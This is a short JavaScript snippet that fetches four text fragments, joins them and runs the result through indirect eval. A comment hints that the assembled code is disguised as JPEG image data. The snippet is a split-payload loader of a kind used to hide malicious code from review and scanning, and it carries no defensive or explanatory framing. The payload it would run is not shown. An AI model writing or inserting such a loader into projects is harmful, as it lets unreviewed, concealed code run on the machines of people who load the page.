/* data:image/jpeg present in assembled source */
(async function () {
  const parts = await Promise.all([0,1,2,3].map(i => fetch("parts/p" + i + ".txt").then(r => r.text())));
  (0, eval)(parts.join(""));
})();
